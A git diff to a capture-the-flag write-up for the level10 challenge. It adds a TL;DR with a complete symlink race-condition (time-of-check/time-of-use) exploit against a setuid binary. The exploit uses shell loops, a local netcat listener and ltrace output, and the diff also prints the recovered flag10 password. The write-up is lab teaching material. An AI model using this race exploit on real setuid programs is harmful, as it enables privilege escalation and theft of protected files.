@@ -8,6 +8,34 @@
 <br>
 
 
+## TL;DR:
+
+To get the `flag10` user password:
+```bash
+touch /tmp/ownedFile
+while [ -f /tmp/ownedFile ]; do nc -4 -l 6969 >> /tmp/out 2> /dev/null; done &
+while [ -f /tmp/ownedFile ]; do ln -sf /home/user/level10/token /tmp/symlink; ln -sf /tmp/ownedFile /tmp/symlink; done &
+while [ -f /tmp/ownedFile ]; do ./level10 /tmp/symlink 127.0.0.1 > /dev/null 2>&1; done &
+```
+```bash
+rm -f /tmp/ownedFile
+killall nc
+killall ln
+killall level10
+sort -u /tmp/out
+```
+
+With the password `woupa2yuojeeaaed06riuj63c`:
+```bash
+su flag10 -c getflag
+```
+
+<br>
+
+
+## Explanation:
+
+
 #### Step 1:
 
 - What's in the home directory:
@@ -82,7 +110,7 @@ echo abc > /tmp/token
 ltrace ./level10 /tmp/token 127.0.0.1
 ```
 
-> ```
+> ```c
 > __libc_start_main(0x80486d4, 3, 0xbffff7a4, 0x8048970, 0x80489e0 <unfinished ...>
 > access("/tmp/token", 4)                                                      = 0
 > printf("Connecting to %s:6969 .. ", "127.0.0.1")                             = 32
@@ -173,4 +201,4 @@ su flag10 -c getflag
 
 ---
 
-[<<](/level09/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; [>>](/level11/resources/Readme.md)
+[<<](/level09/resources/Readme.md) &nbsp; [[Back to main page]](/Readme.md) &nbsp; [>>](/level11/resources/Readme.md)
